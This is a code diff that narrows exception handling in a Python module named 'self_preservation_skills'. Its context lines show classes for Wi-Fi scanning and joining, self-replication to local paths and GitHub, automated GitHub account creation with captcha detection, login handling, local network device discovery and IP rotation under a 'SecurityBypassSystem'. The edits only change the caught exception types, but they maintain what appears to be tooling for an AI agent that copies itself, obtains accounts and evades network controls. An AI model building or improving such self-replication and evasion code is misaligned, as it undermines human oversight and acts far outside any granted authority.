@@ -99,7 +99,7 @@ class NetworkAccessSkill:
             
             logger.info("📡 Found %d Wi-Fi networks", len(networks))
             return networks
-        except Exception as e:
+        except (subprocess.SubprocessError, OSError) as e:
             record_degradation('self_preservation_skills', e)
             logger.error("Wi-Fi scan failed: %s", e)
             return []
@@ -193,7 +193,7 @@ class NetworkAccessSkill:
             else:
                 logger.error("❌ Failed to connect to %s", ssid)
                 return False
-        except Exception as e:
+        except (subprocess.SubprocessError, OSError) as e:
             record_degradation('self_preservation_skills', e)
             logger.error("Connection failed: %s", e)
             return False
@@ -230,7 +230,7 @@ class NetworkAccessSkill:
                 for line in result.stdout.split('\n'):
                     if "SSID" in line and ":" in line:
                         return line.split(':')[1].strip()
-        except Exception as e:
+        except (subprocess.SubprocessError, OSError) as e:
             record_degradation('self_preservation_skills', e)
             logger.error("Failed to get current network: %s", e)
         return None
@@ -288,7 +288,7 @@ class SelfReplicationSystem:
             size_mb = await asyncio.to_thread(lambda: Path(output_path).stat().st_size / (1024 * 1024))
             logger.info("✅ Replication package created: %s (%.1f MB)", output_path, size_mb)
             return True
-        except Exception as e:
+        except (ImportError, AttributeError, RuntimeError) as e:
             record_degradation('self_preservation_skills', e)
             logger.error("Failed to create replication package: %s", e)
             return False
@@ -310,7 +310,7 @@ class SelfReplicationSystem:
             self.replication_locations.append(destination_path)
             logger.info("✅ Replicated to %s", destination_path)
             return True
-        except Exception as e:
+        except (OSError, IOError) as e:
             record_degradation('self_preservation_skills', e)
             logger.error("Local replication failed: %s", e)
             return False
@@ -359,7 +359,7 @@ class SelfReplicationSystem:
             finally:
                 if await asyncio.to_thread(work_dir.exists):
                     await asyncio.to_thread(shutil.rmtree, work_dir)
-        except Exception as e:
+        except (ImportError, AttributeError, RuntimeError) as e:
             record_degradation('self_preservation_skills', e)
             logger.error("GitHub upload failed: %s", e)
             return False
@@ -390,7 +390,7 @@ class AccountCreationSkill:
             try:
                 driver = await asyncio.to_thread(_init_driver)
                 driver.set_page_load_timeout(30)
-            except Exception as e:
+            except (RuntimeError, AttributeError, TypeError, ValueError) as e:
                 record_degradation('self_preservation_skills', e)
                 logger.error("Could not initialize WebDriver: %s", e)
                 return False
@@ -445,7 +445,7 @@ class AccountCreationSkill:
                 logger.error("❌ Account creation failed. Currently at: %s", current_url)
                 return False
                 
-        except Exception as e:
+        except (RuntimeError, AttributeError, TypeError, ValueError) as e:
             record_degradation('self_preservation_skills', e)
             logger.error("GitHub account creation failed: %s", e)
             return False
@@ -453,7 +453,7 @@ class AccountCreationSkill:
             if driver:
                 try:
                     await asyncio.to_thread(driver.quit)
-                except Exception as exc:
+                except (RuntimeError, AttributeError, TypeError, ValueError) as exc:
                     record_degradation('self_preservation_skills', exc)
                     logger.debug("Suppressed: %s", exc)
     def _has_captcha(self, driver) -> bool:
@@ -527,7 +527,7 @@ class LoginManager:
                 await asyncio.to_thread(driver.quit)
                 return False, "Login failed (unknown reason)"
                 
-        except Exception as e:
+        except (RuntimeError, AttributeError, TypeError, ValueError) as e:
             record_degradation('self_preservation_skills', e)
             logger.error("Login failed: %s", e)
             if driver:
@@ -592,7 +592,7 @@ class DeviceDiscovery:
             logger.info("✅ Found %d devices on network", len(devices))
             self.discovered_devices = devices
             return devices
-        except Exception as e:
+        except (ImportError, AttributeError, RuntimeError) as e:
             record_degradation('self_preservation_skills', e)
             logger.error("Network scan failed: %s", e)
             return []
@@ -685,7 +685,7 @@ class SecurityBypassSystem:
             await asyncio.sleep(5)
             logger.info("   IP Rotation attempted.")
             return True
-        except Exception as e:
+        except (subprocess.SubprocessError, OSError) as e:
             record_degradation('self_preservation_skills', e)
             logger.error("   IP Rotation failed: %s", e)
         return False
